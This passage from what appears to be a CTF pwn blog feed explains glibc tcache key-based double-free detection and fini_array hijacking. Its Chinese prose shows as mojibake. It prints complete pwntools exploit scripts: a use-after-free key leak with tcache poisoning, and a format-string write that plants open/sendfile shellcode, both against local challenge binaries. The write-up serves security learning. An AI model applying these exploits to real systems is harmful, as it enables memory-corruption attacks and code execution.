it&#x27;s already in the tcache.  */</span><br><span class="line">    tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">    /* This test succeeds on double free.  However, we don&#x27;t 100%</span><br><span class="line">       trust it (it also matches random payload data at a 1 in</span><br><span class="line">       2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span><br><span class="line">       coincidence before aborting.  */</span><br><span class="line">    if (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">      &#123;</span><br><span class="line">        tcache_entry *tmp;</span><br><span class="line">        LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);</span><br><span class="line">        for (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">          if (tmp == e)</span><br><span class="line">        malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);</span><br><span class="line">        /* If we get here, it was a coincidence.  We&#x27;ve wasted a</span><br><span class="line">           few cycles, but don&#x27;t abort.  */</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        return;</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">å…ˆåˆ¤æ–­e-&gt;keyæ˜¯ä¸æ˜¯tcacheï¼Œæ˜¯çš„è¯ï¼Œå°±è¿›å…¥ä¸€ä¸ªå¾ªç¯ï¼Œéå†è¯¥chunkæ‰€åœ¨é“¾è¡¨æ‰€æœ‰çš„chunkåˆ¤æ–­æ˜¯å¦ä¸é‡Šæ”¾çš„chunkåœ°å€ä¸€è‡´ï¼Œä¸€è‡´åˆ™ç›¸åŒ</font></p><p><font style="color:rgb(51, 51, 51);">å…³äºe-&gt;keyä¸ºä»€ä¹ˆä¼šæ˜¯tcacheï¼Œåœ¨tcache_putå‡½æ•°ä¸­æœ‰ä½“ç°ï¼š</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="line">   for more chunks.  */</span><br><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="line">     detect a double free.  */</span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">è¯¥ç‰ˆæœ¬ä¸­ï¼Œé‡Šæ”¾çš„chunkä¼šå°†tcacheå†™å…¥keyå­—æ®µä¸­ï¼Œç„¶åå°±æ˜¯é“¾è¡¨å¤´æ’èŠ‚ç‚¹ï¼Œæ•°é‡åŠ ä¸€</font></p><h3 id="font-style-color-rgb-51-51-51-ç»•è¿‡åˆ†æ-font"><font style="color:rgb(51, 51, 51);">ç»•è¿‡åˆ†æ</font></h3><p><font style="color:rgb(51, 51, 51);">keyæ ¡éªŒæœºåˆ¶çš„å…³é”®ç‚¹æœ‰2ä¸ªï¼šæ ¡éªŒkeyå€¼ï¼Œæ˜¯å¦ç­‰äºtcacheç»“æ„ä½“åœ°å€</font></p><ul><li><font style="color:rgb(51, 51, 51);">ä¸ç­‰äºçš„è¯ï¼Œå°±ç›´æ¥æ­£å¸¸é‡Šæ”¾</font></li><li><font style="color:rgb(51, 51, 51);">ç­‰äºçš„è¯ï¼Œ</font><strong><font style="color:rgb(51, 51, 51);">éå†å¯¹åº”å¤§å°çš„é“¾è¡¨</font></strong><font style="color:rgb(51, 51, 51);">æ£€æŸ¥æ˜¯å¦å­˜åœ¨Double-Free</font></li></ul><p><font style="color:rgb(51, 51, 51);">å¸¸è§„çš„ç»•è¿‡keyæœºåˆ¶çš„æ–¹å¼æ˜¯ä¿®æ”¹keyå­—æ®µï¼Œå¸¸è§é€šè¿‡Overflowæˆ–è€…UAFæˆ–è€…æ³„éœ²æ¥å®Œæˆ</font></p><p><font style="color:rgb(51, 51, 51);">heap_addr=key&lt;&lt;12</font></p><h3 id="font-style-color-rgb-51-51-51-ç»•è¿‡æ–¹æ³•-font"><font style="color:rgb(51, 51, 51);">ç»•è¿‡æ–¹æ³•</font></h3><h4 id="æ³„éœ²">æ³„éœ²</h4><p>å½“å­˜åœ¨uafçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ³„éœ²keyï¼Œå°±å¯ä»¥ç»•è¿‡</p><p>ä¿®æ”¹fdä½ï¼šxor_free_hook=free_hook^key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key=u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li(<span class="built_in">hex</span>(key))</span><br><span class="line">heap_base=(key&lt;&lt;<span class="number">12</span>)-<span class="number">0x1000</span></span><br><span class="line">li(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">flag_xor=flag^key</span><br><span class="line">edit(<span class="number">0</span>,p64(flag_xor-<span class="number">0x10</span>))</span><br></pre></td></tr></table></figure><p>ä¾‹é¢˜</p><p>flagè¢«è¯»å…¥0x4060ï¼Œå¹¶ç»™å‡ºpie_base</p><p>add,edit,show,freeå››ä¸ªåŠŸèƒ½å‡½æ•°</p><p>2.35ç‰ˆæœ¬ï¼Œuaf</p><p>uafæ³„éœ²å‡ºkeyä¹‹åtcachebin attack å°†flagå †å—ç”³è¯·å‡ºæ¥ï¼Œshowå°±å¯ä»¥å¾—åˆ°flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1731410367915-aae1ee10-12f0-4e23-ae52-ecfdb3fe86ae.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1731410389619-0bc1b17a-3938-4338-a614-d6281c944a5b.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.35.so&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">pie_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1a44</span></span><br><span class="line">li(<span class="built_in">hex</span>(pie_base))</span><br><span class="line">flag=pie_base+<span class="number">0x4060</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">rl(<span class="string">&quot;5.exit&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">rl(<span class="string">&quot;input size&gt;&gt;&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(size))</span><br><span class="line">rl(<span class="string">&quot;input data&gt;&gt;&quot;</span>)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">i,content</span>):</span><br><span class="line">rl(<span class="string">&quot;5.exit&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">rl(<span class="string">&quot;input index&gt;&gt;&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line">rl(<span class="string">&quot;input data&gt;&gt;&quot;</span>)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;5.exit&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">rl(<span class="string">&quot;input index&gt;&gt;&quot;</span>)</span><br><span class="line">s(<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;5.exit&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">rl(<span class="string">&quot;input index&gt;&gt;&quot;</span>)</span><br><span class="line">s(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">rl(<span class="string">&quot;data&gt;&gt;\n&quot;</span>)</span><br><span class="line">key=u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li(<span class="built_in">hex</span>(key))</span><br><span class="line">heap_base=(key&lt;&lt;<span class="number">12</span>)-<span class="number">0x1000</span></span><br><span class="line">li(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">bug()</span><br><span class="line">flag_xor=flag^key</span><br><span class="line">edit(<span class="number">0</span>,p64(flag_xor-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="font-style-color-rgb-34-34-38-House-of-Karui-font"><font style="color:rgb(34, 34, 38);">House of Karui</font></h4><p><a href="https://blog.csdn.net/Mr_Fmnwon/article/details/142422852">ã€æˆ‘çš„ PWN å­¦ä¹ æ‰‹æœ­ã€‘House of Karui â€”â€” tcache key ç»•è¿‡_tcache keyæ€ä¹ˆæ‰¾-CSDNåšå®¢</a></p>]]></content>
    
    
    <summary type="html">2.34çš„keyå¼‚æˆ–ç»•è¿‡</summary>
    
    
    
    <category term="Chunk" scheme="https://www.thir0th.xyz/categories/Chunk/"/>
    
    
    <category term="Pwn" scheme="https://www.thir0th.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>fini_arrayåŠ«æŒ</title>
    <link href="https://www.thir0th.xyz/posts/6db984ee.html"/>
    <id>https://www.thir0th.xyz/posts/6db984ee.html</id>
    <published>2025-04-19T16:18:35.000Z</published>
    <updated>2025-05-07T08:12:05.322Z</updated>
    
    <content type="html"><![CDATA[<h1>éæ ˆä¸ŠfmtåŠ«æŒ</h1><p><a href="https://www.cnblogs.com/seyedog/p/17891490.html">https://www.cnblogs.com/seyedog/p/17891490.html</a></p><h2 id="åŸç†åˆ†æ">åŸç†åˆ†æ</h2><p>ç¨‹åºæ‰§è¡Œæµç¨‹å›¾ï¼š</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726713479270-56b817f8-817e-4336-8cfc-fb463d07ff76.png" alt=""></p><p>å‡½æ•°æœ€ç»ˆexité€€å‡ºæ—¶ä¼šè°ƒç”¨fini_arrayå‡½æ•°ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶fini_arrayï¼Œå°±å¯ä»¥åŠ«æŒç¨‹åºæµç¨‹</p><p>dl_finiå‡½æ•°</p><p>main-&gt;exit-&gt;<strong><font style="color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);">__run_exit_handlers-&gt;dl_fini</font></strong></p><p><strong><font style="color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);">dl_finiå‡½æ•°ä¸­ä¼šè°ƒç”¨call rax</font></strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726713632424-eb86c69d-1e65-4f80-9900-29dcc570b6d2.png" alt=""></p><p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶l_addrï¼Œæµ…ç´«è‰²ä¸ºæ®‹å­˜ä¸‹æ¥çš„l_addråœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨fmtå»ä¿®æ”¹è¿™ä¸ªæ•°å€¼,åŠ«æŒç¨‹åºè¿”å›åˆ°tar_addr</p><p>åç§»è®¡ç®—ï¼šåç§»=tar_addr-fini_arry_addr</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714211462-96e208c7-58cc-4585-b1d7-783926810183.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726713703387-c634b302-5b6f-49d0-80a2-e0d1acf6cde7.png" alt=""></p><h2 id="ä¾‹é¢˜">ä¾‹é¢˜</h2><p>2023é‡‘ç›¾æ¯çš„ä¸€é“é¢˜</p><p>è¿™é‡Œæœ‰close(1)ï¼Œæ²¡åŠæ³•è¾“å‡ºï¼Œè¿™æ ·æˆ‘ä»¬åç§»å°±ä¸å¥½æ‰¾ï¼ŒåŒæ—¶å¼€å¯æ²™ç›’ï¼Œåªæœ‰ä¸€æ¬¡éæ ˆä¸Šfmt</p><p>æ€è·¯ï¼šç›´æ¥ç”¨åˆ°fini_arrayåŠ«æŒï¼Œ<font style="color:rgb(34, 34, 34);">é€šè¿‡ä¿®æ”¹dl_finiæ•°ç»„é‡Œçš„åç§»å€¼ï¼Œä½¿å‡½æ•°åœ¨é€€å‡ºæ—¶æ‰§è¡Œæˆ‘ä»¬å†™åœ¨bssæ®µä¸Šçš„shellcode</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726382942358-8ae4fc44-76b3-43d2-b127-440e1a7796b5.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726713136255-e1963cea-ee23-4e3d-8647-cb61f1d88020.png" alt=""></p><p>æˆ‘ä»¬å¯ä»¥å°†close(1) ä¿®æ‰ï¼Œnopæ‰</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714408563-9e64ff30-ca94-4dc3-8fea-82f55aa9114b.png" alt=""></p><p>å®Œæˆï¼š</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714480116-3a82770d-a9df-4543-b4fa-23118d0347d2.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714489260-968affba-4ab2-4af7-95a2-c0f3e134fa7b.png" alt=""></p><p>ä¿å­˜</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714515960-fde24aba-0ecd-4a5a-82d2-8e6e2fdc83e2.png" alt=""></p><p>åç§»è®¡ç®—</p><p>åç§»=shellcode_addr-fini_addr</p><p><font style="color:rgb(34, 34, 34);">0x40406B - 0x403D98 = 723</font></p><p><font style="color:rgb(34, 34, 34);">ä¿®æ”¹çš„åŒæ—¶è¯»å…¥orw shellcode</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">pr = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">bss=0x404060</span><br><span class="line">shellcode  =asm(shellcraft.open(&quot;/flag&quot;))</span><br><span class="line">shellcode +=asm(shellcraft.read(3,bss+0x50,0x100))</span><br><span class="line">shellcode +=asm(shellcraft.write(2,bss+0x50,0x100))</span><br><span class="line">pay=asm(&#x27;&#x27;&#x27;    </span><br><span class="line">    mov rax, 0x67616c662f2e</span><br><span class="line">    push rax</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    sub rdi, 100</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    push SYS_openat</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    mov rdi, 1</span><br><span class="line">    mov rsi, 3</span><br><span class="line">    push 0</span><br><span class="line">    mov rdx, rsp</span><br><span class="line">    mov r10, 0x100</span><br><span class="line">    push SYS_sendfile</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    &#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rl(&quot;Let&#x27;s start!&quot;)</span><br><span class="line">payload=b&#x27;%723c%30$hn&#x27;+p64(0x40406b+8)+pay</span><br><span class="line">pr(hex(len(payload)))</span><br><span class="line">bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p><font style="color:rgb(34, 34, 34);"></font></p><h1>æ ˆä¸ŠfmtåŠ«æŒ</h1><p><font style="color:rgb(48, 49, 51);">fmtç›´æ¥ä¿®æ”¹</font></p><p><font style="color:rgb(48, 49, 51);">[CISCN 2019è¥¿å—]</font></p><p><font style="color:rgb(48, 49, 51);">ç»™å‡ºsystemå‡½æ•°ï¼Œä½†åªæœ‰ä¸€æ¬¡fmtï¼Œ64å­—èŠ‚ï¼Œä¿®æ”¹printf.got-system.plt,fini_array-main</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726716333395-b27c9ea5-5c4d-473e-8786-2edff5f8ded2.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 